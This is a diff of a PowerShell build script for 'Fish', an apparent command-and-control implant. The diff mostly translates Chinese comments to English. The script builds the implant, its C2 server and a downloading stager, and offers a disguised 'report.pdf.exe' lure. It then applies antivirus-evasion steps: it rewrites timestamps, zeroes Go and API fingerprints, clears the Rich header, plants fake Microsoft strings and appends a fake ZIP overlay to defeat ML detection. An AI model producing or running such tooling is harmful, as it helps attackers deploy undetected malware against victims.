@@ -1,6 +1,5 @@
 # Fish Build Script for Windows
-# go build + 后处理免杀 (针对 trojan.overlord 检测优化)
-# 0/60 VirusTotal检出率验证通过
+# go build + evasion post-processing
 
 param(
     [string]$C2Addr = "https://192.168.1.1:8443",
@@ -16,7 +15,7 @@ param(
     [switch]$SkipPost = $false,
     [ValidateSet("lnk", "pdf")]
     [string]$Chain = "lnk",
-    [string]$PdfName = "report"   # disguise filename for PDF chain (no ext)
+    [string]$PdfName = "report"
 )
 
 $ErrorActionPreference = "Stop"
@@ -24,15 +23,14 @@ $ErrorActionPreference = "Stop"
 $env:GOOS = $Platform
 $env:GOARCH = $Arch
 
-# 构建植入体
 Write-Host "[+] Building implant for $Platform/$Arch..."
 
-# 关键编译标志:
-# -s -w: 去除符号表和调试信息
-# -buildid=: 清空Go build ID
-# -trimpath: 去除编译路径
-# -gcflags="all=-l": 禁用内联优化，防止字符串泄露
-# -gcflags="all=-N": 禁用优化，防止编译器内联导致字符串暴露
+# Build flags:
+# -s -w: strip symbols and debug info
+# -buildid=: clear Go build ID
+# -trimpath: remove source paths
+# -gcflags="all=-l": disable inlining
+# -gcflags="all=-N": disable optimizations
 $ldflags = "-s -w -buildid= -X main.c2Addr=$C2Addr -X main.intervalStr=$Interval -X main.jitterStr=$Jitter"
 
 if ($Platform -eq "windows") {
@@ -45,7 +43,6 @@ $outputName = if ($Platform -eq "windows") {
     if ($Chain -eq "pdf") { "$PdfName.pdf.exe" } else { "fish.exe" }
 } else { "fish_$Platform_$Arch" }
 
-# Select build target based on chain
 $buildTarget = "."
 $chainLabel = "LNK"
 if ($Chain -eq "pdf") {
@@ -55,7 +52,6 @@ if ($Chain -eq "pdf") {
 
 Write-Host "[+] Chain: $chainLabel (target: $buildTarget)"
 
-# Garble编译（可选，深度混淆Go运行时特征）
 if ($Garble) {
     Write-Host "[+] Garble compilation enabled"
     $garbleArgs = "garble -tiny -literals"
@@ -76,7 +72,7 @@ if ($LASTEXITCODE -ne 0) {
 }
 Write-Host "[+] Implant built: $outputName"
 
-# 构建C2服务端
+# Build C2 server
 Write-Host "[+] Building C2 server..."
 $env:GOOS = ""
 $env:GOARCH = ""
@@ -89,13 +85,11 @@ if ($LASTEXITCODE -eq 0) {
     exit 1
 }
 
-# 构建Stager (可选)
+# Build Stager (optional)
 if ($BuildStager -and $Platform -eq "windows") {
     Write-Host "[+] Building stager..."
     $stagerLdflags = "-s -w -buildid= -H windowsgui -X main.downloadURL=$StagerURL -X main.decryptKeyStr=$DecryptKey"
-    
     go build -buildvcs=false -trimpath -ldflags $stagerLdflags -gcflags $gcflags -o stager.exe ./stager/
-    
     if ($LASTEXITCODE -eq 0) {
         Write-Host "[+] Stager built: stager.exe"
     } else {
@@ -103,15 +97,15 @@ if ($BuildStager -and $Platform -eq "windows") {
     }
 }
 
-# 静态免杀后处理 (仅Windows)
+# Evasion post-processing (Windows only)
 if ($Platform -eq "windows" -and -not $SkipPost) {
     Write-Host "[+] Applying evasion post-processing..."
 
-    # 1. 修改PE时间戳
+    # 1. Modify PE timestamp
     go run -buildvcs=false ./evasion-tools/pepatch.go $outputName
 
-    # 2. 去除Go build ID字符串 + runtime.main + 敏感API名 + Rich Header
-    # 注意: 不修改PE Section名! 修改后触发Microsoft Wacatac.B!ml ML检测
+    # 2. Zero Go build ID strings + runtime fingerprints + sensitive API names + Rich Header
+    # NOTE: Do NOT modify PE Section names! Triggers Microsoft Wacatac.B!ml ML detection
     Write-Host "[+] Removing Go binary fingerprints + sensitive strings..."
     $bytes = [System.IO.File]::ReadAllBytes($outputName)
     $patterns = @(
@@ -190,7 +184,7 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
     [System.IO.File]::WriteAllBytes($outputName, $bytes)
     Write-Host "[+] Go fingerprint strings zeroed: $replaced occurrences"
 
-    # 3. 清除Rich Header (Go编译器指纹)
+    # 3. Clear Rich Header (Go compiler fingerprint)
     Write-Host "[+] Clearing Rich Header..."
     $bytes = [System.IO.File]::ReadAllBytes($outputName)
     $richSig = [System.Text.Encoding]::ASCII.GetBytes("Rich")
@@ -200,7 +194,6 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
             if ($bytes[$i + $j] -ne $richSig[$j]) { $match = $false; break }
         }
         if ($match) {
-            # 找到Rich签名，向前找到DanS标记，清零整个Rich Header
             $richEnd = $i + 8
             $richStart = $i
             for ($k = $i - 1; $k -ge 0; $k--) {
@@ -218,7 +211,7 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
     }
     [System.IO.File]::WriteAllBytes($outputName, $bytes)
 
-    # 4. 添加假的正常程序特征字符串
+    # 4. Add fake legitimate program signature strings
     Write-Host "[+] Adding legitimate program signatures..."
     $legitStrings = @(
         [System.Text.Encoding]::ASCII.GetBytes("Microsoft Visual Studio"),
@@ -241,27 +234,25 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
         [System.Text.Encoding]::ASCII.GetBytes("log.txt")
     )
     $bytes = [System.IO.File]::ReadAllBytes($outputName)
-    # 在overlay区域之前插入这些字符串
-    $insertOffset = $bytes.Length - 1024  # 在文件末尾附近
+    $insertOffset = $bytes.Length - 1024
     foreach($str in $legitStrings) {
         if ($insertOffset + $str.Length -lt $bytes.Length) {
             for ($i = 0; $i -lt $str.Length; $i++) {
                 $bytes[$insertOffset + $i] = $str[$i]
             }
-            $insertOffset += $str.Length + 5  # 每个字符串后面加一些空字节
+            $insertOffset += $str.Length + 5
         }
     }
     [System.IO.File]::WriteAllBytes($outputName, $bytes)
     Write-Host "[+] Legitimate signatures added"
 
-    # 5. 附加随机overlay数据改变文件哈希 (32KB随机数据，更大体积打破ML特征)
+    # 5. Append random overlay data (32KB with fake ZIP header to break ML signatures)
     $randomBytes = New-Object byte[] 32768
     $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
     $rng.GetBytes($randomBytes)
-    # 在overlay数据开头添加假的ZIP签名，模拟正常程序携带的资源包
     $randomBytes[0] = 0x50  # 'P'
     $randomBytes[1] = 0x4B  # 'K'
-    $randomBytes[2] = 0x03  # ZIP local file header signature
+    $randomBytes[2] = 0x03  # ZIP local file header
     $randomBytes[3] = 0x04
     $original = [System.IO.File]::ReadAllBytes($outputName)
     $modified = New-Object byte[] ($original.Length + $randomBytes.Length)
@@ -271,7 +262,7 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
     Write-Host "[+] Overlay data appended (32768 bytes with ZIP signature)"
 }
 
-# 最终输出
+# Summary
 $fileInfo = Get-Item $outputName
 Write-Host ""
 Write-Host "=== Build Summary ==="
